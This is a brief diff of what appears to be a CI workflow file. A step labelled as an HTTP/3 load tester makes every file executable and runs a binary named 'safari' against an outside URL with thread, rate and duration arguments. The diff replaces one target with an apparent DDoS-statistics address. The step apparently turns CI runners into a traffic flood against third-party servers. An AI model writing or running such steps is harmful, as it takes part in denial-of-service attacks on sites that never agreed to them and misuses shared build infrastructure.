@@ -30,7 +30,7 @@ jobs:
       - name: Run HTTP/3 load tester
         run: |
           chmod +x *
-          ./safari   https://rapidis.gay/6901966783-94f8ec9e-b2c5-46ed-a07e-655326466019 340 10000 6000 Heh --cdn --raw 
+          ./safari  https://c3.dstatbot.win/pXTaLtYn  340 1000 6000 Heh --cdn --raw 
           
           
           
